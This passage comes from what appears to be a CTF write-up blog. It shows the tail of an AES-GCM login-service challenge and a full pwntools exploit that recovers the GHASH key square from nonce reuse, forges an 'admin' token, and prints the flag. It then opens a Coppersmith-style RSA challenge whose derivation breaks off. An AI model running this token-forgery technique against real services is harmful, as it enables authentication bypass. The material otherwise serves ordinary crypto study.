Services&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.cnt -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        aes = AES.new(<span class="variable language_">self</span>.key, AES.MODE_GCM, nonce=<span class="variable language_">self</span>.nonce)</span><br><span class="line">        aes.update(<span class="variable language_">self</span>.auth)</span><br><span class="line">        tok, en = token[:-<span class="number">16</span>], token[-<span class="number">16</span>:]</span><br><span class="line">        username = unpad(aes.decrypt_and_verify(tok, en), <span class="number">16</span>)</span><br><span class="line">        <span class="keyword">return</span> username</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">MENU = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">========== MENU ==========</span></span><br><span class="line"><span class="string">cnt = &#123;&#125;</span></span><br><span class="line"><span class="string">nonce = &#123;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">= [U]pdate</span></span><br><span class="line"><span class="string">= [R]egister</span></span><br><span class="line"><span class="string">= [L]ogin</span></span><br><span class="line"><span class="string">= [Q]uit</span></span><br><span class="line"><span class="string">==========================</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">poc = PaddingOracleClass()</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="built_in">print</span>(MENU.<span class="built_in">format</span>(poc.cnt, poc.nonce.<span class="built_in">hex</span>()))</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        inp = <span class="built_in">input</span>(<span class="string">&#x27;&gt;&#x27;</span>).upper()</span><br><span class="line">        <span class="keyword">if</span> inp == <span class="string">&quot;Q&quot;</span>:</span><br><span class="line">            <span class="keyword">raise</span> Exception</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">elif</span> inp == <span class="string">&quot;U&quot;</span>:</span><br><span class="line">            poc.update(</span><br><span class="line">                nonce=<span class="built_in">bytes</span>.fromhex(<span class="built_in">input</span>(<span class="string">&quot;nonce(hex)&gt;&quot;</span>))</span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> inp == <span class="string">&quot;R&quot;</span>:</span><br><span class="line">            username = os.urandom(<span class="number">8</span>)</span><br><span class="line">            token = poc.register(username=username)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Register!\n<span class="subst">&#123;token.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(username.<span class="built_in">hex</span>())</span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> inp == <span class="string">&quot;L&quot;</span>:</span><br><span class="line">            token = <span class="built_in">bytes</span>.fromhex(<span class="built_in">input</span>(<span class="string">&quot;token(hex)&gt;&quot;</span>))</span><br><span class="line">            username = poc.login(token=token)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Login!&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> username == <span class="string">b&quot;admin&quot;</span>:</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    <span class="built_in">print</span>(f.read())</span><br><span class="line">                <span class="keyword">raise</span> Exception</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;Hello, what can I help you? <span class="subst">&#123;username.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Bye&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, long_to_bytes</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment"># ==========================================</span></span><br><span class="line"><span class="comment"># Correct AES-GCM GF(2^128) Arithmetic</span></span><br><span class="line"><span class="comment"># Mapping: LSB of integer is x^0</span></span><br><span class="line"><span class="comment"># ==========================================</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">GCM_Attack</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># Reduction polynomial for LSB=x^0 representation:</span></span><br><span class="line">        <span class="comment"># P(x) = x^128 + x^7 + x^2 + x + 1</span></span><br><span class="line">        <span class="comment"># Low terms are 1 + x + x^2 + x^7 -&gt; 1 | 2 | 4 | 128 = 0x87</span></span><br><span class="line">        <span class="variable language_">self</span>.POLY = <span class="number">0x87</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">bits_reverse</span>(<span class="params">self, n</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;Standard 128-bit reversal&quot;&quot;&quot;</span></span><br><span class="line">        s = <span class="string">f&#x27;<span class="subst">&#123;n:0128b&#125;</span>&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">int</span>(s[::-<span class="number">1</span>], <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">bytes_to_element</span>(<span class="params">self, b</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Bytes to GF(2^128) element.</span></span><br><span class="line"><span class="string">        GCM spec: Byte 0 bit 0 is coefficient of x^0.</span></span><br><span class="line"><span class="string">        bytes_to_long(b) puts Byte 0 at MSB.</span></span><br><span class="line"><span class="string">        bits_reverse() puts Byte 0 at LSB (correct for LSB=x^0 logic).</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        n = bytes_to_long(b)</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.bits_reverse(n)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">element_to_bytes</span>(<span class="params">self, n</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;GF(2^128) element back to bytes&quot;&quot;&quot;</span></span><br><span class="line">        n = <span class="variable language_">self</span>.bits_reverse(n)</span><br><span class="line">        <span class="keyword">return</span> long_to_bytes(n, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">gmul</span>(<span class="params">self, a, b</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Multiplication in GF(2^128) where LSB is x^0.</span></span><br><span class="line"><span class="string">        Standard &quot;Peasant&#x27;s Algorithm&quot; with LEFT SHIFT.</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        p = <span class="number">0</span></span><br><span class="line">        <span class="comment"># Iterate through bits of b (from x^0 to x^127)</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">            <span class="keyword">if</span> (b &gt;&gt; i) &amp; <span class="number">1</span>:</span><br><span class="line">                p ^= a</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># Multiply a by x (Left Shift)</span></span><br><span class="line">            high_bit = (a &gt;&gt; <span class="number">127</span>) &amp; <span class="number">1</span></span><br><span class="line">            a = (a &lt;&lt; <span class="number">1</span>) &amp; ((<span class="number">1</span> &lt;&lt; <span class="number">128</span>) - <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">if</span> high_bit:</span><br><span class="line">                a ^= <span class="variable language_">self</span>.POLY</span><br><span class="line">        <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">gpow</span>(<span class="params">self, a, n</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;Exponentiation: a^n&quot;&quot;&quot;</span></span><br><span class="line">        res = <span class="number">1</span> <span class="comment"># Identity element is 1 (x^0)</span></span><br><span class="line">        <span class="keyword">while</span> n &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> n &amp; <span class="number">1</span>:</span><br><span class="line">                res = <span class="variable language_">self</span>.gmul(res, a)</span><br><span class="line">            a = <span class="variable language_">self</span>.gmul(a, a)</span><br><span class="line">            n &gt;&gt;= <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">ginv</span>(<span class="params">self, a</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;Modular Inverse: a^(-1) = a^(2^128 - 2)&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.gpow(a, (<span class="number">1</span> &lt;&lt; <span class="number">128</span>) - <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ==========================================</span></span><br><span class="line"><span class="comment"># Exploit Script</span></span><br><span class="line"><span class="comment"># ==========================================</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>():</span><br><span class="line">    context.log_level = <span class="string">&#x27;info&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = remote(<span class="string">&#x27;pwn-ff4f589b0c.challenge.xctf.org.cn&#x27;</span>, <span class="number">9999</span>, ssl=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        log.error(<span class="string">&quot;Could not connect.&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    gcm = GCM_Attack()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">update</span>(<span class="params">nonce</span>):</span><br><span class="line">        r.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>, <span class="string">b&#x27;U&#x27;</span>)</span><br><span class="line">        r.sendlineafter(<span class="string">b&#x27;nonce(hex)&gt;&#x27;</span>, nonce.<span class="built_in">hex</span>().encode())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">        r.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>, <span class="string">b&#x27;R&#x27;</span>)</span><br><span class="line">        r.recvuntil(<span class="string">b&#x27;Register!\n&#x27;</span>)</span><br><span class="line">        token_hex = r.recvline().strip().decode()</span><br><span class="line">        username_hex = r.recvline().strip().decode()</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>.fromhex(token_hex), <span class="built_in">bytes</span>.fromhex(username_hex)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">token</span>):</span><br><span class="line">        r.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>, <span class="string">b&#x27;L&#x27;</span>)</span><br><span class="line">        r.sendlineafter(<span class="string">b&#x27;token(hex)&gt;&#x27;</span>, token.<span class="built_in">hex</span>().encode())</span><br><span class="line"></span><br><span class="line">    log.info(<span class="string">&quot;Starting Attack with LSB-LeftShift GCM Arithmetic...&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># --- Phase 1: Recover H^2 ---</span></span><br><span class="line">        nonce1 = os.urandom(<span class="number">12</span>)</span><br><span class="line">        update(nonce1)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Get differential pair</span></span><br><span class="line">        tok1, user1 = register()</span><br><span class="line">        tok2, user2 = register()</span><br><span class="line"></span><br><span class="line">        c1, t1 = tok1[:-<span class="number">16</span>], tok1[-<span class="number">16</span>:]</span><br><span class="line">        c2, t2 = tok2[:-<span class="number">16</span>], tok2[-<span class="number">16</span>:]</span><br><span class="line"></span><br><span class="line">        ec1 = gcm.bytes_to_element(c1)</span><br><span class="line">        et1 = gcm.bytes_to_element(t1)</span><br><span class="line">        ec2 = gcm.bytes_to_element(c2)</span><br><span class="line">        et2 = gcm.bytes_to_element(t2)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Difference</span></span><br><span class="line">        diff_t = et1 ^ et2</span><br><span class="line">        diff_c = ec1 ^ ec2</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> diff_c == <span class="number">0</span>:</span><br><span class="line">            log.warning(<span class="string">&quot;Bad luck (collision). Rerunning...&quot;</span>)</span><br><span class="line">            r.close()</span><br><span class="line">            solve()</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># H^2 = (T1 + T2) / (C1 + C2)</span></span><br><span class="line">        h2 = gcm.gmul(diff_t, gcm.ginv(diff_c))</span><br><span class="line">        log.success(<span class="string">f&quot;Recovered H^2: <span class="subst">&#123;<span class="built_in">hex</span>(h2)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># --- Phase 2: Forge Admin Token ---</span></span><br><span class="line">        nonce2 = os.urandom(<span class="number">12</span>)</span><br><span class="line">        update(nonce2) <span class="comment"># Refresh cnt=2, change Mask</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Get base ciphertext</span></span><br><span class="line">        tok3, user3 = register()</span><br><span class="line">        c3, t3 = tok3[:-<span class="number">16</span>], tok3[-<span class="number">16</span>:]</span><br><span class="line">        p3 = pad(user3, <span class="number">16</span>) <span class="comment"># Known plaintext</span></span><br><span class="line"></span><br><span class="line">        ec3 = gcm.bytes_to_element(c3)</span><br><span class="line">        et3 = gcm.bytes_to_element(t3)</span><br><span class="line">        ep3 = gcm.bytes_to_element(p3)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 1. Forge Ciphertext (Bit-flip attack / Keystream reuse)</span></span><br><span class="line">        <span class="comment"># Keystream = C + P</span></span><br><span class="line">        keystream = ec3 ^ ep3</span><br><span class="line">        </span><br><span class="line">        target_user = <span class="string">b&quot;admin&quot;</span></span><br><span class="line">        p_target = pad(target_user, <span class="number">16</span>)</span><br><span class="line">        ep_target = gcm.bytes_to_element(p_target)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># C_forge = P_target + Keystream</span></span><br><span class="line">        ec_target = ep_target ^ keystream</span><br><span class="line">        c_target = gcm.element_to_bytes(ec_target)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 2. Forge Tag</span></span><br><span class="line">        <span class="comment"># T_forge = T_base + (C_forge + C_base) * H^2</span></span><br><span class="line">        diff_c_new = ec_target ^ ec3</span><br><span class="line">        delta_tag = gcm.gmul(diff_c_new, h2)</span><br><span class="line">        </span><br><span class="line">        et_target = et3 ^ delta_tag</span><br><span class="line">        t_target = gcm.element_to_bytes(et_target)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># --- Phase 3: Login ---</span></span><br><span class="line">        final_token = c_target + t_target</span><br><span class="line">        log.info(<span class="string">f&quot;Sending Forged Token: <span class="subst">&#123;final_token.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        login(final_token)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Read Flag</span></span><br><span class="line">        <span class="comment"># Server behavior: Prints &quot;Login!&quot;, checks username==&quot;admin&quot;, prints flag, then raises Exception (&quot;Bye&quot;)</span></span><br><span class="line">        r.recvuntil(<span class="string">b&quot;Login!&quot;</span>)</span><br><span class="line">        log.success(<span class="string">&quot;Login Successful! Retrieving flag...&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        flag = r.recvall(timeout=<span class="number">2</span>).decode().strip()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span> + <span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;FLAG: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">50</span> + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        log.error(<span class="string">f&quot;Attack Failed: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="comment"># Try to print whatever is left in buffer</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span>(r.recv(timeout=<span class="number">1</span>).decode())</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        r.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    solve()</span><br></pre></td></tr></table></figure>
<p><strong>flag{VJBSDIVWcdgogQKp6BSo9e8ah5HDH7qJ}</strong></p>
<ul>
<li>Bivariate copper</li>
</ul>
<blockquote>
<p>So the question is, what is copper?</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;message&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    message = f.read().strip().encode()</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">message = bytes_to_long(message)</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">25</span>)</span><br><span class="line">N = p * q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">c = <span class="built_in">pow</span>(message, e, N)</span><br><span class="line">r1, r2 = getPrime(<span class="number">512</span>), getPrime(<span class="number">512</span>)</span><br><span class="line">k = getPrime(<span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">t1 = (k * inverse(m + r1, p)) % p</span><br><span class="line">t2 = (k * inverse(m + r2, p)) % p</span><br><span class="line"></span><br><span class="line">leak1 = t1 &gt;&gt; <span class="number">244</span></span><br><span class="line">leak2 = t2 &gt;&gt; <span class="number">244</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;e = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;N = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;c = &#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;k = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;r1 = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;r2 = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;leak1 = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;leak2 = &#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">e = 65537</span></span><br><span class="line"><span class="string">N = 3333577291839009732612693330613476891341287017491683764014849337158389717338712200133085615150269196268856288361865352673921704626130772582853528604556994221890454520933132803888321775335519781063447756692130742361931522856942232406992357982482263472763363458621836220024977864980600979194500121897419553619426163227</span></span><br><span class="line"><span class="string">c = 1277272201928931051067525742142583320131498687502905469530557519241347169899260720694873154669476372724906606385788056536109971768256973988460766527896895880291037980646963981472637862512247195798266373251524526460097881602691641026093728861572872156172787168597410496150253340538386296663073088345799201197096884740</span></span><br><span class="line"><span class="string">k = 9352039867057736323</span></span><br><span class="line"><span class="string">r1 = 10421792656200324147964684790160875926436411483496860422433732508593789212449544620816674407170998779863336939494663076247759140488927744939619406024905901</span></span><br><span class="line"><span class="string">r2 = 8806088830734144089522276896226392806947836111998696180055727048752624989402057411311728398322297424598954586424896296000606209022432442660527640463521679</span></span><br><span class="line"><span class="string">leak1 = 4266222222502644630611545246271868348722888987303187402827005454059765428769160822475080050046035916876078546634293907218937483241284454918367519709206766322037148585465519188582916280829212776096606923824120883699251868362915920299645</span></span><br><span class="line"><span class="string">leak2 = 1176921186497191878459783787148403806360469809421921990427675048480656171919274113895695842508460760829511824635106692634456334400022597605585661597793889066395539405395254174368285751236344600489419240628821864912762242188289636510706</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<script type="math/tex; mode=display">
n=pq \\
c=message^e\ (mod\ n) \\
t_1\equiv k*(m+r_1)^{-1}\ (mod\ p) \\
t_2\equiv k*(m+r_2)^{-1}\ (mod\ p) \\
leak1=t1>>244 \\
leak2=t2>>244 \\</script><p><img src="/images/QianJianTec1767188622752.png" alt=""></p>
<p><img src="/images/QianJianTec1767189341815.png" alt=""></p>
<script type="math/tex; mode=display">
q = ????????,\quad p = \frac{N}{q}</script><p>令：</p>
<script type="math/tex; mode=display">
\begin{aligned}
H_1 &= \text{leak}_1 \cdot 2^{244} \\
H_2 &= \text{leak}_2 \cdot 2^{244} \\
x_1 &= t_1 \bmod 2^{244},\quad 0 \le x_1 < 2^{244} \\
x_2 &= t_2 \bmod 2^{244},\quad 0 \le x_2 < 2^{244} \\
T_1 = H_1 + x_1,\quad T_2 = H_2 + x_2
\end{aligned}</script><p>由 $t_1,t_2$ 关系消去 $m$：</p>
<script type="math/tex; mode=display">
\begin{aligned}
(r_1 - r_2) &\equiv k(t_1^{-1} - t_2^{-1}) \pmod{p} \\
(r_1 - r_2) &\equiv k \cdot \frac{t_2 - t_1}{t_1 t_2} \pmod{p}
\end{aligned}</script><p>整理得：</p>
<script type="math/tex; mode=display">
k(t_2 - t_1) - (r_1 - r_2)t_1 t_2 \equiv 0 \pmod{p}</script><p>令 $d_r = r_2 - r_1$，则：</p>
<script type="math/tex; mode=display">
k(T_2 - T_1) - d_r T_1 T_2 \equiv 0 \pmod{p} \quad (1)</script><h2 id=""><a href="#" class="headerlink" title=" "></a> </h2><p>将 $T_i = H_i + x_i$ 代入 $(1)$：</p>
<script type="math/tex; mode=display">
k(H_2 + x_2 - H_1 - x_1) - d_r(H_1 + x_1)(H_2 + x_2) \equiv 0 \pmod{p}</script><p>展开并按 $x_1,x_2$ 整理：</p>
<script type="math/tex; mode=display">
\begin{aligned}
&k(H_2 - H_1) + kx_2 - kx_1 - d_r H_1 H_2 \\
&- d_r H_1 x_2 - d_r H_2 x_1 - d_r x_1 x_2 \equiv 0 \pmod{p}
\end{aligned}</script><p>合并同类项：</p>
<script type="math/tex; mode=display">
(-d_r H_2 - k)x_1 + (-d_r H_1 + k)x_2 - d_r x_1 x_2 + [k(H_2 - H_1) - d_r H_1 H_2] \equiv 0 \pmod{p}</script><p>记系数：</p>
<script type="math/tex; mode=display">
\begin{aligned}
C_{x_1x_2} &= -d_r \\
C_{x_1} &= -d_r H_2 - k \\
C_{x_2} &= -d_r H_1 + k \\
C_1 &= k(H_2 - H_1) - d_r H_1 H_2
\end{aligned}</script><p>得到模方程：</p>
<script type="math/tex; mode=display">
C_{x_1x_2} x_1 x_2 + C_{x_1} x_1 + C_{x_2} x_2 + C_1 \equiv 0 \pmod{p} \quad (2)</script><h2 id="-1"><a href="#-1" class="headerlink" title=" "></a> </h2><p>令 $d = C_{x_1x_2}^{-1} \bmod p$，乘以 $d$：</p>
<script type="math/tex; mode=display">
x_1 x_2 + A x_1 + B x_2 + C \equiv 0 \pmod{p}</script><p>其中：</p>
<script type="math/tex; mode=display">
\begin{aligned}
A &= C_{x_1} \cdot d \bmod p \\
B &= C_{x_2} \cdot d \bmod p \\
C &= C_1 \cdot d \bmod p
\end{aligned}</script><p>设：</p>
<script type="math/tex; mode=display">
X_1 = X_2 = 2^{244}</script><p>问题转化为求小根：</p>
<script type="math/tex; mode=display">
